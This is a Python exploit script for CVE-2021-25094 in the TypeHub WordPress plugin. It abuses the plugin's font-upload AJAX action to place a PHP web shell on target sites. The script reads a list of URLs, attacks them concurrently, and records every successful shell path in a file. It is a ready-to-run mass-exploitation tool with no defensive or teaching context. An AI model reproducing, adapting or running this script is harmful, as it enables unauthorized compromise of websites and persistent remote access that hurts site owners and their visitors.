# This script exploits a vulnerability (CVE-2021-25094) in the TypeHub WordPress plugin.
# Author: Aliester Crowley

import requests
import re
import time
import os
import platform
from concurrent.futures import ThreadPoolExecutor

BYellow = '\033[1;33m'
NC = '\033[0m'
BRed = '\033[1;31m'
BGreen = '\033[1;32m'

def clear_console():
    system = platform.system()
    if system == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def exploit(url):
    payload = {
        'action': 'add_custom_font'
    }
    try:
        files = {
            'file': ('up.zip', open('up.zip', 'rb'))
        }
    except FileNotFoundError:
        print("Error: up.zip file not found. Please make sure it exists.")
        return

    try:
        response = requests.post(f'{url}/wp-admin/admin-ajax.php', data=payload, files=files)
        json_text = response.text

        match = re.search(r'"status":"([^"]*)"', json_text)
        if match:
            status = match.group(1)
        else:
            print(f"[+] {url} - {BRed}[ Failed! ]{NC}")
            return

        if status == "SUCCESS":
            shell_link = f"{url}/wp-content/uploads/typehub/custom/up/.up.php"
            print(f"[+] {url} - {BGreen}[ Shell uploaded! ]{NC}")

            with open("Success.txt", "a") as success_file:
                success_file.write(f"{url} - {shell_link}\n")
        else:
            print(f"[+] {url} - {BRed}[ Failed! ]{NC}")
    except requests.exceptions.RequestException:
        print(f"[+] {url} - {BRed}[ Failed! ]{NC}")

def main():
    clear_console()
    print("""
 _____            _____     _      _____         _     _ _           
|_   __ _ ___ ___|  |  |_ _| |_   |   __|_ _ ___| |___|_| |_ ___ ___ 
  | || | | . | -_|     | | | . |  |   __|_'_| . | | . | |  _| -_|  _| 
  |_||_  |  _|___|__|__|___|___|  |_____|_,_|  _|_|___|_|_| |___|_|  
     |___|_|                                |_|                      
""")
    print("TypeHub Exploit - CVE-2021-25094")
    print("Created by Aliester Crowley")
    print("")

    filename = input("List: ")

    if not os.path.isfile(filename):
        print(f"Error: {filename} not found.")
        return

    with open(filename, 'r') as f:
        urls = [line.strip() for line in f.readlines()]

    urls = [url if url.startswith("http://") or url.startswith("https://") else "http://" + url for url in urls]

    with ThreadPoolExecutor() as executor:
        executor.map(exploit, urls)


if __name__ == "__main__":
    main()

